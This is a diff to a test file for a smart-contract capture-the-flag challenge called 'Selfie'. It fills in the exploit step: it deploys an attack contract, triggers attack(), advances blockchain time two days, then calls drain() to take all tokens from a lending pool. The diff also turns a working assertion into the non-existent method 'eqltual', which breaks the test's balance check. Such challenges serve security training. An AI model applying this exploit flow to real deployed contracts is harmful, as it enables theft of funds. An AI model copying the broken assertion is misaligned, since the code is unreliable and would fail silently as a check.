@@ -21,6 +21,8 @@ describe('[Challenge] Selfie', function () {
             this.token.address,
             this.governance.address    
         );
+        const SelfieAttackFactory = await ethers.getContractFactory('SelfieAttack', deployer);
+        this.SelfieAttack = await SelfieAttackFactory.deploy(this.pool.address, this.governance.address, attacker.address,this.token.address)
 
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
@@ -30,7 +32,9 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        await this.SelfieAttack.attack();
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await this.SelfieAttack.drain();
     });
 
     after(async function () {
@@ -39,7 +43,7 @@ describe('[Challenge] Selfie', function () {
         // Attacker has taken all tokens from the pool
         expect(
             await this.token.balanceOf(attacker.address)
-        ).to.be.equal(TOKENS_IN_POOL);        
+        ).to.be.eqltual(TOKENS_IN_POOL);        
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.equal('0');
